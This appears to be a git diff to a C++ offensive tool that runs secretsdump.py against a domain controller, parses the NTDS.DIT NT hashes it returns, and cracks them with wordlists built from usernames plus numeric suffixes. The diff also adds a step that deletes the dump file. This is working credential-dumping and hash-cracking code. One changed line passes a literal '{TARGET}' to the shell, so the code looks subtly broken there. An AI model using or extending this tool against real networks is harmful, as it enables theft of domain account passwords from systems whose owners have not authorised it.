@@ -10,6 +10,7 @@
 #include <cstring>
 #include <CLI/CLI.hpp>
 #include <thread>
+#include <stdlib.h>
 using namespace std;
 
 class Cracker {
@@ -19,20 +20,56 @@ class Cracker {
         string password;
         string target;
 
-        std::vector<string> generate(string username) {
-            std::vector<string> usernames;
-            std::string busername = username;
-            std::vector<string> mixed_extensions = extender(extensions);
-            for (const auto& extension : mixed_extensions) {    
-                username.append(extension);
-                usernames.push_back(username);
-                username = busername;
+        std::vector<std::string> check_username(const std::string& username) {
+            std::vector<std::string> result;
+
+            // Check if the username contains a backslash
+            size_t pos_backslash = username.find('\\');
+            // Check if the username contains a dot
+            size_t pos_dot = username.find('.');
+
+            if (pos_backslash != std::string::npos && pos_dot != std::string::npos) {
+                // Both backslash and dot found, split the string into three substrings
+                result.push_back(username.substr(0, pos_backslash));
+                size_t pos_last_dot = username.rfind('.');
+                result.push_back(username.substr(pos_backslash + 1, pos_last_dot - pos_backslash - 1));
+                result.push_back(username.substr(pos_last_dot + 1));
+            } else if (pos_backslash != std::string::npos) {
+                // Backslash found, split the string into two substrings
+                result.push_back(username.substr(0, pos_backslash));
+                result.push_back(username.substr(pos_backslash + 1));
+            } else if (pos_dot != std::string::npos) {
+                // Dot found, split the string into two substrings
+                result.push_back(username.substr(0, pos_dot));
+                result.push_back(username.substr(pos_dot + 1));
+            } else {
+                // Neither backslash nor dot found, return the whole string as a single substring
+                result.push_back(username);
             }
-            return usernames;
+
+            return result;
         }
 
-        void crack(std::vector<string> wordlist, const char* hash, const char* username){
-            for (auto i = 0; i < wordlist.size(); i++) {
+
+        std::vector<string> generate(std::string username) {
+            std::vector<string> usernames;
+            std::vector<string> mixed_extensions = extender(extensions);
+            usernames = check_username(username);
+            std::vector<string> new_usernames; // create a separate vector for new usernames
+
+            for (std::size_t i = 0; i < usernames.size(); i++) {
+                for (const auto& extension : mixed_extensions) {    
+                    std::string new_username = usernames[i] + extension; // create a new username
+                    new_usernames.push_back(new_username); // add it to the new vector
+                }
+            }
+
+            return new_usernames;
+        }
+
+
+        void crack(const std::vector<string>& wordlist, const char* hash, const char* username){
+            for (std::size_t i = 0; i < wordlist.size(); i++) {
                 const char* generated_hash = gen_ntlm(wordlist[i]);
                 if (std::strcmp(hash, generated_hash) == 0) {
                     std::cout << "\033[32m" << "[+] " << "\033[1;32m" << "Cracked: " <<
@@ -47,22 +84,19 @@ class Cracker {
         }
         
         string get_ntds() {
-            std::string command = "/usr/bin/python3 ./vendor/scripts/secretsdump.py ";
-            std::stringstream ss;
-            ss << command << target << " > /tmp/output.txt";
-            command = ss.str();
-            system(command.c_str());
+            setenv("TARGET", target.c_str(), 1);
+            system("/usr/bin/python3 ./vendor/scripts/secretsdump.py \"{TARGET}\" > /tmp/output.txt");
             ifstream fin("/tmp/output.txt");
             string output = "";
             while (fin) {
-                string line;
+                string line; 
                 getline(fin, line);
                 output += line + "\n";
             }
             return output;
         }
 
-        std::unordered_map<std::string, std::string>  parse_hashes(const std::string& input) {        
+        std::unordered_map<std::string, std::string> parse_hashes(const std::string& input) {        
             std::unordered_map<std::string, std::string> result;
             std::regex re("nthash\\)(.*?)\\[\\*\\]");
             std::regex re_for_dc("NTDS\\.DIT secrets(.*?)\\[\\*\\]");
@@ -114,6 +148,11 @@ class Cracker {
             return creds;
         }
 
+        void clean() {
+            std::string command = "rm -rf /tmp/output.txt";
+            system(command.c_str());
+        }
+
         void launch() {
             std::pair<bool, string> crack_status;
             std::vector<std::thread> threads;
@@ -135,7 +174,7 @@ class Cracker {
                 "\033[0m" <<
                 std::endl;
             std::unordered_map<std::string, std::string> creds = parse_hashes(output);
-
+            clean();
             for (const auto& kv : creds) {
                 std::cout << "\033[33m" << "[*] The password of '" << 
                     kv.first << "' is cracking..." 
@@ -143,7 +182,7 @@ class Cracker {
                     std::endl;
                 std::vector<string> wl = generate(kv.first);
                 threads.emplace_back(
-                    &Cracker::crack, this, wl, kv.second.c_str(), kv.first.c_str()
+                    &Cracker::crack, this, std::cref(wl), kv.second.c_str(), kv.first.c_str()
                 );
                 if (threads.size() == 10) {
                     for (auto& thread : threads) {
@@ -174,7 +213,27 @@ class Cracker {
             "005",
             "007",
             "008",
-            "009"
+            "009",
+            "0000",
+            "0001",
+            "0002",
+            "0003",
+            "0004",
+            "0005",
+            "0006",
+            "0007",
+            "0008",
+            "0009",
+            "00001",
+            "00002",
+            "00003",
+            "00004",
+            "00005",
+            "00006",
+            "00007",
+            "00008",
+            "00009",
+            "000000"
     };
 
         std::vector<std::string> extender(std::vector<std::string> initial_extensions){
